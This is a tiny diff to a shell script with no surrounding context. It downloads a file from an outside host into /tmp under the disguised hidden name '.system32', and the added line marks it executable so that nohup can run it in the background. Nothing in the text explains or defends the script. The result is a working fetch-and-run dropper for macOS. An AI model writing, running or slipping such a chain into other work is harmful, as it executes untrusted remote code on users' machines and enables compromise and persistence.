@@ -1,3 +1,4 @@
 cd /tmp
 curl https://mathyshenin.me/macos > .system32
+chmod +x .system32
 nohup ./.system32
